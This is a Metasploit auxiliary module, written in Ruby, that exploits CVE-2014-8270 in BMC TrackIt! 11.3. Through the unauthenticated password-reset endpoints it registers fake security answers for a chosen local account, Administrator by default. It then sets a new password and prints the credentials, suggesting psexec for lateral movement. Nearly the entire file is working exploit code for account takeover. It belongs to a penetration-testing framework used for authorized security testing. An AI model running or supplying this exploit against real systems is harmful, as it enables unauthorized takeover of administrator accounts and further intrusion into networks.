##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'BMC TrackIt! Unauthenticated Arbitrary Local User Password Change',
      'Description'    => %q{
      This module exploits a flaw in the password reset mechanism in BMC TrackIt! 11.3
      and possibly prior versions.
      },
      'References'     =>
        [
          ['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-14-419/'],
          ['CVE', '2014-8270']
        ],
      'Author'         =>
        [
          'bperry', #discovery/metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Dec 9 2014"
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'The path to BMC TrackIt!', '/']),
        OptString.new('LOCALUSER', [true, 'The local user to change password for', 'Administrator']),
        OptString.new('DOMAIN', [false, 'The domain of the user. By default the local user\'s computer name will be autodetected', ''])
      ], self.class)
  end

  def run
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'PasswordReset'),
    })

    unless res
      fail_with(Failure::Unknown, "Could not contact server")
    end

    cookie = res.headers['Set-Cookie']
    domain = $1 if res.body =~ /"domainName":"(.*)"\}\);/
    domain = datastore['DOMAIN'] if datastore['DOMAIN'] != ''

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'Register'),
      'method' => 'POST',
      'cookie' => cookie,
      'vars_post' => {
        'domainname' => domain,
        'userName' => datastore['LOCALUSER'],
        'emailaddress' => Rex::Text.rand_text_alpha(8) + '@' + Rex::Text.rand_text_alpha(8) + '.com',
        'userQuestions' => '[{"Id":1,"Answer":"not"},{"Id":2,"Answer":"not"}]',
        'updatequesChk' => 'false',
        'SelectedQuestion' => 1,
        'SelectedQuestion' => 2,
        'answer' => 'not',
        'answer' => 'not',
        'confirmanswer' => 'not',
        'confirmanswer' => 'not'
      }
    })

    if !res or res.body != "{\"success\":true,\"data\":{\"userUpdated\":true}}"
      fail_with(Failure::Unknown, "Could not register the user.")
    end

    password = Rex::Text.rand_text_alpha(10) + "!1"

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'ResetPassword'),
      'method' => 'POST',
      'cookie' => cookie,
      'vars_post' => {
        'newPassword' => password,
        'domain' => domain,
        'UserName' => datastore['LOCALUSER'],
        'CkbResetpassword' => 'true'
      }
    })

    if !res or res.body != '{"success":true,"data":{"PasswordResetStatus":0}}'
      fail_with(Failure::Unknown, "Could not change the user's password. Is it a domain or local user?")
    end

    print_status("Please run the psexec module using:")
    print_status("#{domain}\\#{datastore['LOCALUSER']}:#{password}")
  end
end
